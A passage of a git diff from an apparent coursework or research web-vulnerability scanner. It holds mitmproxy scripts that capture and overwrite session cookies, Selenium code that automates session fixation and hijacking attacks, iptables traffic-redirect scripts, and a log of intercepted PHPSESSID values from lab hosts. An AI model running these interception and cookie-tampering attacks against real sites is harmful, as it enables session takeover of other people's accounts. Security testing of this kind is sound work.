attack[\"form_parameter\"], attack[\"button\"], attack[\"cookie\"], \"predictableCookies\"))\n+      elif attack[\"cookie\"][\"attack\"].strip() == \"predictableCookie\":\n+        self.attacks_list.append(PredictableCookieAttack(attack[\"link\"], attack[\"form_parameter\"], attack[\"button\"], attack[\"cookie\"]))\n \n   def get_attacks_list(self):\n     return self.attacks_list\ndiff --git a\/attack_category_detector.sh b\/attack_category_detector.sh\ndeleted file mode 100644\nindex e69de29..0000000\ndiff --git a\/attacks.json b\/attacks.json\ndeleted file mode 100644\nindex 4f0a9cb..0000000\n--- a\/attacks.json\n+++ \/dev\/null\n@@ -1,50 +0,0 @@\n- [\n-  {\n-    \"link\": [\n-      \"https:\/\/app1.com\/admin\/index.php?page=login\"\n-    ],\n-    \"form_parameter\": [\n-      {\n-        \"account\": \"adminname\",\n-        \"account_value\": \"admin\",\n-        \"password\": \"password\",\n-        \"password_value\": \"admin\"\n-      }\n-    ],\n-    \"button\": [\n-      \"submit\"\n-    ],\n-    \"cookie\": [\n-      {\n-        \"name\":\"session\",\n-        \"secure\":false,\n-        \"httpOnly\":false,\n-        \"attack\": [\"sessionHijacking \",\"predictableCookies\"]\n-      }\n-    ]\n-  },\n-  {\n-    \"link\": [\n-      \"https:\/\/app1.com\/users\/login.php\"\n-    ],\n-    \"form_parameter\": [\n-      {\n-        \"account\": \"username\",\n-        \"account_value\": \"scanner1\",\n-        \"password\": \"password\",\n-        \"password_value\": \"scanner1\"\n-      }\n-    ],\n-    \"button\": [\n-      \"login\"\n-    ],\n-        \"cookie\": [\n-      {\n-        \"name\":\"PHPSESSION\",\n-        \"secure\":false,\n-        \"httpOnly\":false,\n-        \"attack\": [\"sessionFixation\"]\n-      }\n-    ]\n-  }\n-]\ndiff --git a\/test.py b\/automation_starter.py\nsimilarity index 64%\nrename from test.py\nrename to automation_starter.py\nindex 7cb7d7c..14013d7 100644\n--- a\/test.py\n+++ b\/automation_starter.py\n@@ -1,10 +1,11 @@\n import json\n from attack_category_detector import AttackCategoryDetector\n \n-attacks = open('phase3output.json')\n+attacks = open('App1\/phase3output.json')\n json_string = attacks.read().decode(\"utf-8-sig\")\n data = json.loads(json_string)\n detector = AttackCategoryDetector(data)\n \n for index, attack in enumerate(detector.get_attacks_list()):\n-  attack.perform()\n+  if attack.type == \"session_fixation\" or attack.type == \"session_hijacking\":\n+    attack.perform()\ndiff --git a\/mitm_session_fixation.py b\/mitm_scripts\/mitm_predictable_cookie_attack.py\nsimilarity index 100%\nrename from mitm_session_fixation.py\nrename to mitm_scripts\/mitm_predictable_cookie_attack.py\ndiff --git a\/mitm_scripts\/mitm_session_fixation.py b\/mitm_scripts\/mitm_session_fixation.py\nnew file mode 100644\nindex 0000000..1105dd1\n--- \/dev\/null\n+++ b\/mitm_scripts\/mitm_session_fixation.py\n@@ -0,0 +1,24 @@\n+import Cookie\n+import json\n+import os.path\n+\n+def request(context, flow):\n+  print flow.request.headers\n+  if os.path.isfile(\"tmp_cookie.txt\") :\n+    with open('tmp_cookie.txt', 'r') as f:\n+      cookie_name = f.read()\n+    print \"COOKIE NAME IS %s\" % cookie_name\n+    if \"Cookie\" in flow.request.headers :\n+      cookie = Cookie.SimpleCookie(flow.request.headers[\"Cookie\"])\n+      print \"request cookie is: %s\" % cookie[cookie_name].value\n+      cookie[cookie_name].set(cookie_name, \"12345\", \"12345\")\n+      print \"update request cookie is: %s\" % cookie.output()\n+      flow.request.headers[\"Cookie\"] = cookie.output().replace(\"Set-Cookie:\", \"\").strip()\n+      print(\"final updated request cookie: %s\" % (flow.request.headers[\"Cookie\"]))\n+  else :\n+    print \"No specific cookie need to investigate\"\n+\n+def response(context, flow):\n+  print flow.response.headers\n+  if \"Set-Cookie\" in flow.response.headers :\n+    print(\"response flag cookie: %s\" % (flow.response.headers[\"Set-Cookie\"]))\ndiff --git a\/mitm_scripts\/mitm_session_hijacking.py b\/mitm_scripts\/mitm_session_hijacking.py\nnew file mode 100644\nindex 0000000..6121b91\n--- \/dev\/null\n+++ b\/mitm_scripts\/mitm_session_hijacking.py\n@@ -0,0 +1,3 @@\n+def request(context, flow):\n+  if(flow.request.headers[\"Cookie\"]) :\n+    print(\"flag cookie: %s\" % (flow.request.headers[\"Cookie\"]))\ndiff --git a\/nohup.out b\/nohup.out\ndeleted file mode 100644\nindex 3a9ef73..0000000\n--- a\/nohup.out\n+++ \/dev\/null\n@@ -1,388 +0,0 @@\n-Error starting proxy server: error(48, 'Address already in use')\n-Error starting proxy server: error(48, 'Address already in use')\n-Error starting proxy server: error(48, 'Address already in use')\n-127.0.0.1:63450: clientconnect\n-127.0.0.1:63452: clientconnect\n-127.0.0.1:63455: clientconnect\n-127.0.0.1:63455: ProtocolException(\"Error in HTTP connection: HttpSyntaxException('Bad HTTP request line: \\\\x05\\\\x01\\\\x00',)\",)\n-127.0.0.1:63452: ProtocolException(\"Error in HTTP connection: HttpSyntaxException('Bad HTTP request line: \\\\x05\\\\x01\\\\x00',)\",)\n-127.0.0.1:63450: ProtocolException(\"Error in HTTP connection: HttpSyntaxException('Bad HTTP request line: \\\\x05\\\\x01\\\\x00',)\",)\n-127.0.0.1:63452: clientdisconnect\n-127.0.0.1:63455: clientdisconnect\n-127.0.0.1:63450: clientdisconnect\n-127.0.0.1:49348: clientconnect\n-127.0.0.1:49348: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49348: Ignoring server verification error, continuing with connection\n-Script error:\n-'Cookie'\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-127.0.0.1:49350: clientconnect\n-127.0.0.1:49351: clientconnect\n-127.0.0.1:49352: clientconnect\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/screen.css\n- << 200 OK 2.62kB\n-127.0.0.1:49351: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49351: Ignoring server verification error, continuing with connection\n-127.0.0.1:49350: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49350: Ignoring server verification error, continuing with connection\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/stylings.css\n- << 200 OK 838B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/print.css\n- << 200 OK 674B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/images\/search_button_white.gif\n- << 200 OK 508B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/images\/menu\/menu_tabs.gif\n- << 200 OK 3.87kB\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=vigrtbr0gr1dpieh0l76dsfud6\n-updated flag cookie: 12345\n-127.0.0.1 POST https:\/\/app1.com\/users\/login.php\n- << 303 See Other 0B\n-flag cookie: PHPSESSID=910v97jn0kr1a9vaf0k33uog71\n-updated flag cookie: 12345\n-127.0.0.1:49361: clientconnect\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/users\/home.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=fqan4jb3ot14ehk58bl9pqiki2\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-127.0.0.1:49350: clientdisconnect\n-Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-mitmproxy has crashed!\n-Please lodge a bug report at: https:\/\/github.com\/mitmproxy\/mitmproxy\n-127.0.0.1:49351: clientdisconnect\n-127.0.0.1:49348: clientdisconnect\n-127.0.0.1:49352: Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-127.0.0.1:49352: clientdisconnect\n-127.0.0.1:49415: clientconnect\n-127.0.0.1:49415: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49415: Ignoring server verification error, continuing with connection\n-Script error:\n-'Cookie'\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-127.0.0.1:49417: clientconnect\n-127.0.0.1:49418: clientconnect\n-127.0.0.1:49419: clientconnect\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/screen.css\n- << 200 OK 2.62kB\n-127.0.0.1:49420: clientconnect\n-127.0.0.1:49417: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49417: Ignoring server verification error, continuing with connection\n-127.0.0.1:49418: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49418: Ignoring server verification error, continuing with connection\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/print.css\n- << 200 OK 674B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/css\/stylings.css\n- << 200 OK 838B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/images\/search_button_white.gif\n- << 200 OK 508B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/images\/menu\/menu_tabs.gif\n- << 200 OK 3.87kB\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eobs6fsl61tq7cgi70sofh4r25\n-updated flag cookie: 12345\n-127.0.0.1 POST https:\/\/app1.com\/users\/login.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=n5etrl84fpt5pulfhkbcl4e713\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/home.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=eeiaq10qnejfrhnaflt9qm49t3\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-mitmproxy has crashed!\n-Please lodge a bug report at: https:\/\/github.com\/mitmproxy\/mitmproxy\n-127.0.0.1:49417: clientdisconnect\n-127.0.0.1:49418: clientdisconnect\n-127.0.0.1:49415: clientdisconnect\n-127.0.0.1:49419: Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-127.0.0.1:49419: clientdisconnect\n-127.0.0.1:49478: clientconnect\n-127.0.0.1:49478: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49478: Ignoring server verification error, continuing with connection\n-127.0.0.1:49480: clientconnect\n-Script error:\n-'Cookie'\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-127.0.0.1:49482: clientconnect\n-127.0.0.1:49483: clientconnect\n-127.0.0.1:49484: clientconnect\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/screen.css\n- << 200 OK 2.62kB\n-127.0.0.1:49483: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49483: Ignoring server verification error, continuing with connection\n-127.0.0.1:49482: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49482: Ignoring server verification error, continuing with connection\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/stylings.css\n- << 200 OK 838B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/print.css\n- << 200 OK 674B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/images\/search_button_white.gif\n- << 200 OK 508B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/images\/menu\/menu_tabs.gif\n- << 200 OK 3.87kB\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=073v67q2l94qo6g85jsi7p6dq2\n-updated flag cookie: 12345\n-127.0.0.1 POST https:\/\/app1.com\/users\/login.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=8b4pvdr9orn6qg9h4ou2enrq42\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/home.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=3vgt3pdsajeicmtvctuiqg78n6\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-mitmproxy has crashed!\n-Please lodge a bug report at: https:\/\/github.com\/mitmproxy\/mitmproxy\n-127.0.0.1:49482: clientdisconnect\n-127.0.0.1:49484: Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-127.0.0.1:49484: clientdisconnect\n-127.0.0.1:49483: clientdisconnect\n-127.0.0.1:49478: clientdisconnect\n-127.0.0.1:49535: clientconnect\n-127.0.0.1:49535: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49535: Ignoring server verification error, continuing with connection\n-127.0.0.1:49537: clientconnect\n-Script error:\n-'Cookie'\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-127.0.0.1:49539: clientconnect\n-127.0.0.1:49540: clientconnect\n-127.0.0.1:49541: clientconnect\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/screen.css\n- << 200 OK 2.62kB\n-127.0.0.1:49539: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49539: Ignoring server verification error, continuing with connection\n-127.0.0.1:49540: TLS verification failed for upstream server at depth 0 with error: 20\n-127.0.0.1:49540: Ignoring server verification error, continuing with connection\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/css\/stylings.css\n- << 200 OK 838B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/css\/blueprint\/print.css\n- << 200 OK 674B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/images\/search_button_white.gif\n- << 200 OK 508B\n-Script error:\n-'Set-Cookie'\n-127.0.0.1 GET https:\/\/app1.com\/images\/menu\/menu_tabs.gif\n- << 200 OK 3.87kB\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/favicon.ico\n- << 404 Not Found 283B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=ouj6fgfm9cfa3omcc9gmnvfe66\n-updated flag cookie: 12345\n-127.0.0.1 POST https:\/\/app1.com\/users\/login.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=de0cqp7k5tuj5mjbh6b7s9ipa0\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/home.php\n- << 303 See Other 0B\n-Script error:\n-'Set-Cookie'\n-flag cookie: PHPSESSID=921qj45r065fq4808eeecoprm4\n-updated flag cookie: 12345\n-127.0.0.1 GET https:\/\/app1.com\/users\/login.php\n- << 200 OK 947B\n-Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-mitmproxy has crashed!\n-Please lodge a bug report at: https:\/\/github.com\/mitmproxy\/mitmproxy\n-127.0.0.1:49540: clientdisconnect\n-127.0.0.1:49539: clientdisconnect\n-127.0.0.1:49535: clientdisconnect\n-127.0.0.1:49541: Traceback (most recent call last):\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/server.py\", line 121, in handle\n-    root_layer()\n-  File \"\/Library\/Frameworks\/Python.framework\/Versions\/2.7\/lib\/python2.7\/site-packages\/mitmproxy\/proxy\/modes\/http_proxy.py\", line 11, in __call__\n-    layer()\n-TypeError: 'NoneType' object is not callable\n-\n-127.0.0.1:49541: clientdisconnect\ndiff --git a\/phase3output.json b\/phase3output.json\ndeleted file mode 100755\nindex 63f5704..0000000\n--- a\/phase3output.json\n+++ \/dev\/null\n@@ -1,18 +0,0 @@\n-[{\n-  \"form_parameter\":{\n-     \"account\":\"username\",\n-     \"password\":\"password\",\n-     \"account_value\":\"bryce\",\n-     \"password_value\":\"bryce\"\n-  },\n-  \"cookie\":{\n-     \"attack\":[\n-        \"sessionFixation\"\n-     ],\n-     \"name\":\"PHPSESSID\",\n-     \"httpOnly\":false,\n-     \"secure\":false\n-  },\n-  \"button\":\"login\",\n-  \"link\":\"https:\/\/app1.com\/users\/login.php\"\n-}]\ndiff --git a\/phase4output.json b\/phase4output.json\nindex effc557..e69de29 100644\n--- a\/phase4output.json\n+++ b\/phase4output.json\n@@ -1 +0,0 @@\n-[{\"cookie\": [{\"attack\": \"sessionFixation\", \"secure\": false, \"httpOnly\": false}], \"page\": \"https:\/\/app1.com\/users\/login.php\"}]\n\\ No newline at end of file\ndiff --git a\/scripts\/client\/6_client.py b\/scripts\/client\/6_client.py\ndeleted file mode 100644\nindex 29ba1a9..0000000\n--- a\/scripts\/client\/6_client.py\n+++ \/dev\/null\n@@ -1,4 +0,0 @@\n-import webbrowser\n-url = 'http:\/\/www.wsb.com\/Assignment2\/case06.php'\n-new = 2 #open in new window\n-webbrowser.open(url,new=new)\ndiff --git a\/scripts\/client\/6_client.sh b\/scripts\/client\/6_client.sh\ndeleted file mode 100644\nindex feb9dba..0000000\n--- a\/scripts\/client\/6_client.sh\n+++ \/dev\/null\n@@ -1,2 +0,0 @@\n-#!\/bin\/bash\n-python 6_client.py\ndiff --git a\/scripts\/proxy\/6_proxy.sh b\/scripts\/proxy\/6_proxy.sh\ndeleted file mode 100644\nindex 6c34129..0000000\n--- a\/scripts\/proxy\/6_proxy.sh\n+++ \/dev\/null\n@@ -1,2 +0,0 @@\n-#!\/bin\/bash\n-sudo .\/mitm.sh\ndiff --git a\/scripts\/proxy\/clean.sh b\/scripts\/proxy\/clean.sh\ndeleted file mode 100644\nindex 23c1dd3..0000000\n--- a\/scripts\/proxy\/clean.sh\n+++ \/dev\/null\n@@ -1,3 +0,0 @@\n-#!\/bin\/bash\n-sudo iptables -t nat -F\n-sudo sysctl -w net.ipv4.ip_forward=0\ndiff --git a\/scripts\/proxy\/mitm.sh b\/scripts\/proxy\/mitm.sh\ndeleted file mode 100644\nindex db044a0..0000000\n--- a\/scripts\/proxy\/mitm.sh\n+++ \/dev\/null\n@@ -1,5 +0,0 @@\n-#!\/bin\/bash\n-.\/clean.sh\n-sysctl -w net.ipv4.ip_forward=1\n-iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n-mitmdump -T --host -s request.py\ndiff --git a\/scripts\/proxy\/request.py b\/scripts\/proxy\/request.py\ndeleted file mode 100644\nindex c06af92..0000000\n--- a\/scripts\/proxy\/request.py\n+++ \/dev\/null\n@@ -1,2 +0,0 @@\n-def request(context, flow):\n-\tprint(\"flag cookie: %s\" % (flow.request.headers[\"Cookie\"]))\ndiff --git a\/session_fixation_attack.py b\/session_fixation_attack.py\nindex 924220a..0779231 100644\n--- a\/session_fixation_attack.py\n+++ b\/session_fixation_attack.py\n@@ -31,21 +31,40 @@ def perform(self):\n         profile.set_preference(\"general.useragent.override\",\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit\/537.75.14 (KHTML, like Gecko) Version\/7.0.3 Safari\/7046A194A\")\n         profile.update_preferences()\n         wd = webdriver.Firefox(firefox_profile=profile)\n-        subprocess.Popen([\"nohup\", \"mitmdump\", \"-s\", \"mitm_session_fixation.py\"])\n+        #subprocess.Popen([\"nohup\", \"mitmdump\", \"-s\", \"mitm_scripts\/mitm_session_fixation.py\"])\n+        with open('tmp_cookie.txt', 'w+') as f:\n+            f.write(self.cookie[\"name\"])\n         time.sleep(1)\n+\n         wd.get(self.link)\n         wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"account\"] + \"']\").send_keys(self.form_parameter[\"account_value\"])\n         wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"password\"] + \"']\").send_keys(self.form_parameter[\"password_value\"])\n         wd.find_element_by_xpath(\"\/\/input[@value='\" + self.button + \"']\").click()\n         proceed_to_server_side_fixation_attack = False\n-        try:\n-            wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"account\"] + \"']\")\n-            wd.find_element_by_xpath(\"\/\/input[@name='\" + self.form_parameter[\"password\"] + \"']\")\n+        recived_cookie = \"\"\n+        for cookie in wd.get_cookies():\n+            if cookie[\"name\"] == self.cookie[\"name\"]:\n+                recived_cookie = cookie[\"value\"]\n+                break\n+        print \"recived_cookie is: %s \" % recived_cookie\n+        if recived_cookie == \"12345\":\n+            print \"CONFIRMED: login sucessfully. client side fixation attack successful.\"\n+            expliot = {\n+                \"page\": self.link,\n+                \"cookie\": [{\n+                    \"name\": self.cookie[\"name\"],\n+                    \"secure\": self.cookie[\"secure\"],\n+                    \"httpOnly\": self.cookie[\"httpOnly\"],\n+                    \"attack\": \"sessionFixation\"\n+                }]\n+            }\n+            self.phase4_output(expliot)\n+        else :\n             print \"CONFIRMED: login unsucessfully. client side fixation attack failed.\"\n             proceed_to_server_side_fixation_attack = True\n-        except NoSuchElementException:\n-            print \"CONFIRMED: login sucessfully. client side fixation attack successful.\"\n-        subprocess.Popen(\"kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')\", shell=True)\n+        #subprocess.Popen(\"kill $(ps -efw | grep mitmdump | grep -v grep | awk '{print $2}')\", shell=True)\n+        subprocess.Popen(\"rm nohup.out\", shell=True)\n+        subprocess.Popen(\"rm tmp_cookie.txt\", shell=True)\n         wd.close()\n \n         if proceed_to_server_side_fixation_attack :\n@@ -73,6 +92,7 @@ def perform(self):\n                     expliot = {\n                         \"page\": self.link,\n                         \"cookie\": [{\n+                            \"name\": self.cookie[\"name\"],\n                             \"secure\": self.cookie[\"secure\"],\n                             \"httpOnly\": self.cookie[\"httpOnly\"],\n                             \"attack\": \"sessionFixation\"\ndiff --git a\/session_hijacking_attack.py b\/session_hijacking_attack.py\nindex 32dc2ef..c206e7c 100644\n--- a\/session_hijacking_attack.py\n+++ b\/session_hijacking_attack.py\n@@ -3,6 +3,11 @@\n from selenium.webdriver.common.by import By\n from selenium.webdriver.support.ui import WebDriverWait\n from selenium.webdriver.support import expected_conditions as EC\n+from selenium.common.exceptions import NoSuchElementException\n+import subprocess\n+import time\n+import json\n+import os\n \n class SessionHijackingAttack(Attack):\n   def __init__(self, link, form_parameter, button, cookie):\n@@ -10,19 +15,45 @@ def __init__(self, link, form_parameter, button, cookie):\n \n   def perform(self):\n     print \"start session_hijacking_attack.\"\n-    wd = webdriver.Chrome()\n+    print \"=============== TRY: session hijacking attack ========================\"\n+    profile = webdriver.FirefoxProfile()\n+    profile.set_preference(\"network.proxy.type\", 1)\n+    profile.set_preference(\"network.proxy.http\", \"127.0.0.1\")\n+    profile.set_preference(\"network.proxy.https\", \"127.0.0.1\")\n+    profile.set_preference(\"network.proxy.ssl\", \"127.0.0.1\")\n+    profile.set_preference(\"network.proxy.ftp\", \"127.0.0.1\")\n+    profile.set_preference(\"network.proxy.socks\", \"127.0.0.1\")\n+    profile.set_preference(\"network.proxy.http_port\", 8080)\n+    profile.set_preference(\"networky.proxy.https_port\", 8080)\n+    profile.set_preference(\"network.proxy.ssl_port\", 8080)\n+    profile.set_preference(\"network.proxy.ftp_port\", 8080)\n+    profile.set_preference(\"network.proxy.socks_port\", 8080)\n+    profile.set_preference(\"general.useragent.override\",\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit\/537.75.14 (KHTML, like Gecko) Version\/7.0.3 Safari\/7046A194A\")\n+    profile.update_preferences()\n+    wd = 